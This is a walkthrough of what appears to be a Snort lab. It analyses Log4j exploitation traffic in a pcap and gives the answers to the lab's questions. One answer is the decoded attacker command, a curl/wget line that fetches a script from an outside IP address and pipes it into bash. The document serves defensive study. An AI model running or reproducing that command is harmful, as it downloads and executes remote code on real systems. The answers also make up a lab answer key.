# Walkthrough

```bash
#Commands that I used
sudo snort -c local.rules -A console -r log4j.pcap
sudo snort -c local.rules -A full -r log4j.pcap -l .
sudo cat snort.log.1703851350 | grep -r -e sid
sudo snort -d -r snort.log.1703853098
```

\
Navigate to the task folder.\


Use the given pcap file.

Use the given rule file (local.rules) to investigate the log4j exploitation.

What is the number of detected packets?

<mark style="color:yellow;">26</mark>

&#x20;

<figure><img src="https://camo.githubusercontent.com/5ab24c5b19c5dae27d59ad703166e485ab3bb3db85c65f1d226a32f144127f7f/68747470733a2f2f692e696d6775722e636f6d2f6278734c5770522e706e67" alt=""><figcaption><p>content of local.rules</p></figcaption></figure>

&#x20;[![](https://camo.githubusercontent.com/e21f952eb38c96f160f2aab13eaeccf4d7b45cefa5512159dd82e8d39ecd1642/68747470733a2f2f692e696d6775722e636f6d2f4c4138673842372e706e67)](https://camo.githubusercontent.com/e21f952eb38c96f160f2aab13eaeccf4d7b45cefa5512159dd82e8d39ecd1642/68747470733a2f2f692e696d6775722e636f6d2f4c4138673842372e706e67)

Investigate the log/alarm files.

How many rules were triggered?.

<mark style="color:yellow;">4</mark>

&#x20;[![](https://camo.githubusercontent.com/c1fdcc3f8bba5920204d48cd90037ab5c4e778673ffe8450650c63451c5509d2/68747470733a2f2f692e696d6775722e636f6d2f5a474a3633374b2e706e67)](https://camo.githubusercontent.com/c1fdcc3f8bba5920204d48cd90037ab5c4e778673ffe8450650c63451c5509d2/68747470733a2f2f692e696d6775722e636f6d2f5a474a3633374b2e706e67)

Investigate the log/alarm files.

What are the first six digits of the triggered rule sids?

<mark style="color:yellow;">210037</mark>

&#x20;

<figure><img src="https://camo.githubusercontent.com/a8e9c02b017de6e27c70313927362077a1fa1469fd8e734a52e92c86e43a6a08/68747470733a2f2f692e696d6775722e636f6d2f327a4e374476492e706e67" alt=""><figcaption></figcaption></figure>

Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.

What is the number of detected packets?

<mark style="color:yellow;">41</mark>

<figure><img src="https://camo.githubusercontent.com/75b19836bb670ce35f4d8f0ded30a852b8a75509a1281936798c1bee30f5132e/68747470733a2f2f692e696d6775722e636f6d2f6a705261486e312e706e67" alt=""><figcaption></figcaption></figure>

&#x20;[![](https://camo.githubusercontent.com/72d2390644f7fa4ba99a15a991fa9d2b1d44e63bf4ee5a3560784e0ebd035010/68747470733a2f2f692e696d6775722e636f6d2f776970555a79522e706e67)](https://camo.githubusercontent.com/72d2390644f7fa4ba99a15a991fa9d2b1d44e63bf4ee5a3560784e0ebd035010/68747470733a2f2f692e696d6775722e636f6d2f776970555a79522e706e67)

Investigate the log/alarm files.

What is the name of the used encoding algorithm?

<mark style="color:yellow;">base64</mark>

&#x20;

<figure><img src="https://camo.githubusercontent.com/b0c085cc9621c026b5aaaa0665f11f2b4e82e17b05217c7aeb9f0aacc56b1ab4/68747470733a2f2f692e696d6775722e636f6d2f436442355132772e706e67" alt=""><figcaption></figcaption></figure>

Investigate the log/alarm files.

What is the IP ID of the corresponding packet?

<mark style="color:yellow;">62808</mark>

&#x20;

<figure><img src="https://camo.githubusercontent.com/5c7cd9cc6443bfa28d765c3c3db770b0754b388d6422f68d17d8d95756c33429/68747470733a2f2f692e696d6775722e636f6d2f574837716d31432e706e67" alt=""><figcaption></figcaption></figure>

Investigate the log/alarm files.

Decode the encoded command.

What is the attacker's command?

<mark style="color:yellow;">(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash</mark>

&#x20;

<figure><img src="https://camo.githubusercontent.com/55211b4fdad6e6823f25e7abaf4e526040c1eeb8469b83aaac5d369b3a02fcca/68747470733a2f2f692e696d6775722e636f6d2f577077393971422e706e67" alt=""><figcaption></figcaption></figure>

What is the CVSS v2 score of the Log4j vulnerability?

<mark style="color:yellow;">9.3</mark>
